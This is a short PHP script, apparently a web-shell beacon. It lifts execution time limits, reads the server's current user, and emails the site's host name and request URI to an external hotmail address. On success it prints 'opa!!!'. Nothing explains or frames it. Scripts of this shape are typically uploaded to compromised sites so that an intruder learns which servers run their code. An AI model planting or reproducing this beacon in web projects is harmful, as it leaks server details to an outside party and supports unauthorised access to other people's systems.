<?php

 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "opa!!!";
 $email1 = "coder.by.mercurio@hotmail.com";
 $headers  = "From: <$email>\r\n";
 
 
 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "opa!!!";
 exit();
 }
 else{
 echo "Erro N�o foi";
 exit();
 }
?>